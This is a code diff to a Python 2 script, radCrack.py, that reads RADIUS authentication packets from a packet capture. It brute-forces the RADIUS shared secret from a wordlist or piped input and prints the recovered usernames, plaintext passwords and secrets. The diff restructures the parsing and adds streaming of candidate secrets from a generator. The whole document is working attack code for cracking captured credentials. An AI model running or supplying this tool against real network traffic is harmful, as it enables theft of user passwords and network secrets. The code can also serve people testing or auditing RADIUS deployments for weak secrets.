@@ -20,7 +20,7 @@ def is_ascii(s):
 
 # Returns a list of radius packets, ip address pairs
 def get_auth_packets(pcapFile):
-  radPacket = []
+  radPackets = []
   p = open(pcapFile, "rb")
   pcap = dpkt.pcap.Reader(p)
   for ts, buf in pcap:
@@ -28,16 +28,17 @@ def get_auth_packets(pcapFile):
     ip = eth.data
     udp = ip.data
     if type(udp)==dpkt.udp.UDP and udp.dport==1812:
-      radPacket.append((udp.data,ip.dst))
+      radPackets.append((udp.data,ip.dst))
   p.close()
-  print "[*] Found "+str(len(radPacket))+" Radius Packets"
-  return radPacket
+  print "[*] Found "+str(len(radPackets))+" Radius Packets"
+  return radPackets
 
-
-# Primary function that takes a pcap file and list of secrets
-# and cracks them
-def crack_pcap(secretlist, pcapFile):
-  print "\n[*] Cracking Radius Packets..."  
+# Grabs important information out of pcap
+# gets all necessary info for cracking all auth packets and returns it in a dict
+# NOTE: in the rare case that the encrypted password of two different auths match
+# then it will skip cracking one of them
+def get_good_stuff_from_pcap(pcapFile):
+  goodstuff = {}
   for udpdata, ipdst in get_auth_packets(pcapFile):
     auth = udpdata[4:20]
     cur = 20
@@ -49,6 +50,21 @@ def crack_pcap(secretlist, pcapFile):
       cur += curlen
       curlen = ord(udpdata[cur+1:cur+2])
     crypt = udpdata[cur+2:cur+curlen]
+
+    goodstuff[crypt] = (ipdst, username, auth)
+  return goodstuff
+
+
+# Primary function that takes a pcap dictionary and list of secrets
+# and cracks them
+def crack_pcap(secretlist, pcapData):
+
+  for curPacket in pcapData.items():
+    crypt = curPacket[0]
+    ipdst = curPacket[1][0]
+    username = curPacket[1][1]
+    auth = curPacket[1][2]
+
     all_passwords = {}
     for secret in secretlist:
       secret = secret.strip()
@@ -67,10 +83,7 @@ def crack_pcap(secretlist, pcapFile):
         print "[*] Username: "+username          
         print "[*] Password: "+password
         print "[*] Shared Secret: "+secret  
-        print " "
 
-
-  print "[*] DONE "
   return (username, all_passwords)
 
 def usage():
@@ -78,22 +91,38 @@ def usage():
   print "python radCrack.py sharedsecret pcapfile"
   print " or "
   print "python radCrack.py -w secretlist pcapfile"
+  print " or "
+  print "./listgenerator | python radCrack.py -w - pcapfile"
   print " "
+  exit(1)
 
-
+#TODO getopts
 
 if len(sys.argv)==4 and sys.argv[1] == "-w":
-  if sys.argv[2] == "-":
-    f = sys.stdin
-  else:
-    f = open(sys.argv[2])
-  secrets = f.readlines()
+  keepGoing = True
   file = sys.argv[3]
-  f.close()
-  crack_pcap(secrets, file)
+  pcapData = get_good_stuff_from_pcap(file)
+  print "\n[*] Cracking Radius Packets..."  
+
+  while keepGoing:
+    if sys.argv[2] == "-":
+      secrets = [sys.stdin.readline()]
+      if not secrets[0]:
+        break
+    else:
+      keepGoing = False
+      f = open(sys.argv[2])
+      secrets = f.readlines()
+      f.close()
+
+    crack_pcap(secrets, pcapData)
 elif len(sys.argv)==3:
   secret = sys.argv[1]
   file = sys.argv[2]
-  crack_pcap([secret], file)
+
+  pcapData = get_good_stuff_from_pcap(file)
+  print "\n[*] Cracking Radius Packets..."  
+  crack_pcap([secret], pcapData)
 else:
   usage()
+print "\n[*] DONE "
